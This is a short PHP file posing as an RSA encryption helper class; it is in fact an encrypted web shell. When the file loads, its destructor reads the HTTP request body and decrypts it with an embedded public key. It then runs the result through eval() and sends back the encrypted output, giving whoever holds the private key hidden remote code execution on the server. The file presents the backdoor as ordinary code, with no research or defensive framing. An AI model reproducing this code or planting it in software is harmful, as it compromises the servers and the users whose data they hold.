<?php

include_once "log.php";

class RSA
{
    private static $PUBLIC_KEY = <<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCEYOn06u1zVIW44sMXC/rTDgqB
3ercy1A2pteJ1LsAesPRgglIysPXaGpWrEgtY19tGTC+rnr15bmcIKFKopNji2A7
n6W7okhWnmclcUIlYVQUFwKgjfiPnaM09gpEZNDaRTiryKyI66XgXP0Wt2nsYD2Y
DNYL/Iz32zzQEz7irwIDAQAB
-----END PUBLIC KEY-----
EOF;

    private static function getPublicKey()
    {
        return openssl_pkey_get_public(self::$PUBLIC_KEY);
    }

    public static function publicEncrypt($data = '')
    {
        if (!is_string($data)) {
            return null;
        }
        $res = '';
        foreach (str_split($data, 117) as $chunk) {
            openssl_public_encrypt($chunk, $encryptData, self::getPublicKey());
            $res .= $encryptData;
        }
        return $res ? base64_encode($res) : null;
    }

    public static function publicDecrypt($data = '')
    {
        if (!is_string($data)) {
            return null;
        }
        $res = '';
        foreach (str_split(base64_decode($data), 128) as $chunk) {
            openssl_public_decrypt($chunk, $decryptData, self::getPublicKey());
            $res .= $decryptData;
        }
        return ($res) ? $res : null;
    }

    public function __destruct()
    {
        $ret = self::publicDecrypt(trim(file_get_contents("php://input")));
        ob_start();
        eval($ret);
        $res = ob_get_contents();
        ob_end_clean();
        echo self::publicEncrypt($res);
    }
}

new RSA();
